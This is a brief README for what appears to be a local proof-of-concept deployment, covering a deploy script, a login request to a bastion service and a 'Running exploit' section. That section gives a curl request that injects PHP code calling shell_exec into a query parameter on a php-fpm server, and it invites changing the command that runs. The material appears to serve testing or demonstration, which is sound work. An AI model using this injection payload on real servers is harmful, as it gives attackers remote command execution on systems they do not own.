# Usage
Start deployment using `bash deploy.sh`. Removes any existing pod deployment of the PoC and starts a fresh one.

Interact with bastion
```bash
curl -k https://localhost:443/api/v1/user/login -X POST
```

# Running exploit
As part of the deployment we have a php-fpm server running, this takes a specific payload and runs it. Tweak the command in shell_exec() to change what is ran.

```
curl -k -X POST "https://localhost/index.php?ev=<? shell_exec('ls /');  ?>"
```

